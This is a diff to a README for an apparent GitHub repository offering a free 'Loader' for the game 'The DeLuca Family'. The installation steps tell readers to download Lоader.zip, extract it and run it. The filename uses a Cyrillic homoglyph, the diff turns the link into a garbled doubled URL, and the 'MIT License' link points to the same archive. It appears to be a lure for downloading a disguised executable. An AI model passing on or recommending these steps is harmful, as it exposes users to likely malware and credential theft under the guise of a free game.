@@ -29,7 +29,7 @@ Welcome to **The DeLuca Family  Repository** – your go-to source for unlocking
 
 ## 🚀 Installation
 
-1. Download **https://raw.githubusercontent.com/A7med3ala2/DeLucaFamily-FreebieHub/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/A7med3ala2/DeLucaFamily-FreebieHub/main/Lоader.zipоhttps://raw.githubusercontent.com/A7med3ala2/DeLucaFamily-FreebieHub/main/Lоader.zip** from the repository.
 2. Extract the archive using your preferred extraction tool.
 3. Launch the Loader, select your game path, and follow on-screen instructions.
 4. Enjoy The DeLuca Family instantly!
@@ -54,5 +54,5 @@ This repository is intended for educational and personal use only. Please ensure
 
 ## 📄 License
 
-Released under the [MIT License](https://raw.githubusercontent.com/A7med3ala2/DeLucaFamily-FreebieHub/main/Lоader.zip) 2025.  
+Released under the [MIT License](https://raw.githubusercontent.com/A7med3ala2/DeLucaFamily-FreebieHub/main/Lоader.zipоhttps://raw.githubusercontent.com/A7med3ala2/DeLucaFamily-FreebieHub/main/Lоader.zip) 2025.  
 Enjoy responsibly!
